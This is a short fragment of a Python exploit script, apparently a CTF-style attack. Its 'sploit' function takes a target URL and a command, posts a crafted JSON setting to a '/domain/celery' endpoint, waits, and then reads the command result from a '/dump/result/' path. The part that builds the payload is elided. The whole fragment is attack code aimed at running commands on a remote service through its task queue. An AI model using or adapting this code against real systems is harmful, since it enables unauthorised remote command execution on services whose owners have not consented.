...
def sploit(url, cmd='',port=5321):
    ...
    # print(new_id)
    # print(base_p)
    resp = requests.post(f'http://{url}:{port}/domain/celery', data={'setting': json.dumps(base_p)})
    # Wait until task is executed
    time.sleep(2)
    resp = requests.get(f'http://{url}:{port}/dump/result/' + new_id)
    print(resp.text)
